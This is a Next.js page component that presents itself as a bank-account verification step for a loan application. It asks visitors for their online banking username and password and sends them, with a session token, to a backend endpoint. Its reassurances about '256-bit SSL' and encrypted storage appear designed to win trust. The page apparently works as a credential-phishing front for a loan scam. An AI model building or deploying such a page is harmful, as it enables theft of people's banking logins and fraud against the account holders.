"use client";

import React, { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";

interface VerificationDetails {
  fullName: string;
  email: string;
  bankName: string;
  accountNumberMasked?: string;
}

export default function BankVerificationPage() {
  const params = useParams();
  const router = useRouter();
  const token = params?.token as string;

  const [loading, setLoading] = useState<boolean>(true);
  const [submitting, setSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState<boolean>(false);

  const [details, setDetails] = useState<VerificationDetails | null>(null);
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");

  const API_BASE_URL =
    process.env.NEXT_PUBLIC_API_URL || "http://localhost:4000";

  useEffect(() => {
    if (!token) return;

    async function fetchVerificationDetails() {
      try {
        setLoading(true);
        setError(null);

        const response = await fetch(
          `${API_BASE_URL}/bank-accountverification/${token}`,
        );

        const contentType = response.headers.get("content-type");
        if (!contentType || !contentType.includes("application/json")) {
          throw new Error(
            "Invalid server response. Please verify backend URL port.",
          );
        }

        if (!response.ok) {
          const data = await response.json();
          throw new Error(
            data.message || "Invalid or expired verification session.",
          );
        }

        const data: VerificationDetails = await response.json();
        setDetails(data);
      } catch (err: any) {
        setError(err.message || "Failed to load verification session.");
      } finally {
        setLoading(false);
      }
    }

    fetchVerificationDetails();
  }, [token, API_BASE_URL]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Please fill in both username and password.");
      return;
    }

    try {
      setSubmitting(true);
      setError(null);

      const response = await fetch(
        `${API_BASE_URL}/bank-accountverification/submit`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token, username, password }),
        },
      );

      if (!response.ok) {
        const data = await response.json();
        throw new Error(
          data.message || "Verification failed. Please check your credentials.",
        );
      }

      setSuccess(true);
    } catch (err: any) {
      setError(err.message || "An error occurred during verification.");
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50 p-4">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-slate-600 font-medium">
            Validating verification session...
          </p>
        </div>
      </div>
    );
  }

  if (success) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center border border-slate-100">
          <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl font-bold">
            ✓
          </div>
          <h2 className="text-2xl font-bold text-slate-900 mb-2">
            Verification Complete!
          </h2>
          <p className="text-slate-600 mb-6">
            Your bank details have been verified successfully. Your loan
            application is now being processed.
          </p>
          <button
            onClick={() => router.push("/")}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-xl transition-colors"
          >
            Return to Home
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl overflow-hidden border border-slate-100">
        <div className="bg-blue-600 p-6 text-white text-center">
          <h1 className="text-xl font-bold">Bank Account Verification</h1>
          <p className="text-blue-100 text-xs mt-1">
            Encrypted 256-bit SSL Secure Session
          </p>
        </div>

        <div className="p-6">
          {error && (
            <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 rounded-xl text-sm">
              {error}
            </div>
          )}

          {details && (
            <div className="mb-6 bg-slate-50 p-4 rounded-xl border border-slate-200 text-xs text-slate-600 space-y-1.5">
              <div className="flex justify-between">
                <span className="font-semibold text-slate-700">Applicant:</span>
                <span>{details.fullName}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-semibold text-slate-700">Bank Name:</span>
                <span>{details.bankName}</span>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Banking Username
              </label>
              <input
                type="text"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter online banking username"
                className="w-full px-4 py-3 rounded-xl border border-slate-300 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none text-sm transition-all"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Banking Password
              </label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter online banking password"
                className="w-full px-4 py-3 rounded-xl border border-slate-300 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none text-sm transition-all"
              />
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-xl transition-all shadow-md hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed mt-2"
            >
              {submitting ? "Verifying..." : "Verify & Complete Application"}
            </button>
          </form>

          <p className="text-[11px] text-slate-400 text-center mt-6">
            🔒 Credentials are securely encrypted in transit and at rest.
          </p>
        </div>
      </div>
    </div>
  );
}
